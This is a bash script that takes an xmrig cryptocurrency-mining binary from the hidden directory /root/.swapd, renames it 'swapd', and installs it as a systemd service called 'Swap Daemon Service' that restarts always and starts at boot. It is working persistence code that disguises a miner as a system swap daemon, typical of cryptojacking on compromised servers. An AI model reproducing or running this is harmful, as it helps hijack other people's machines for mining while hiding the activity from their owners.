#!/bin/bash

echo "[*] Checking current status..."

# Check if binary exists
if [ -f /root/.swapd/xmrig ]; then
    echo "[!] Found xmrig binary, renaming to swapd..."
    mv /root/.swapd/xmrig /root/.swapd/swapd
    chmod +x /root/.swapd/swapd
elif [ -f /root/.swapd/swapd ]; then
    echo "[✓] swapd binary already exists"
else
    echo "[!] ERROR: No binary found in /root/.swapd/"
    echo "Contents of /root/.swapd/:"
    ls -la /root/.swapd/ 2>/dev/null || echo "Directory doesn't exist!"
    exit 1
fi

# Stop the service
echo "[*] Stopping swapd service..."
systemctl stop swapd.service 2>/dev/null

# Update the service file
echo "[*] Updating systemd service file..."
cat >/tmp/swapd.service <<'EOL'
[Unit]
Description=Swap Daemon Service

[Service]
ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL

sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service

# Reload systemd and restart
echo "[*] Reloading systemd daemon..."
sudo systemctl daemon-reload

echo "[*] Starting swapd service..."
sudo systemctl start swapd.service

echo ""
echo "[*] Service status:"
systemctl status swapd.service

echo ""
echo "[*] Verification:"
echo "Binary location: $(which swapd 2>/dev/null || echo '/root/.swapd/swapd')"
ls -lh /root/.swapd/swapd 2>/dev/null
echo ""
echo "Process check:"
ps aux | grep -E "swapd|xmrig" | grep -v grep
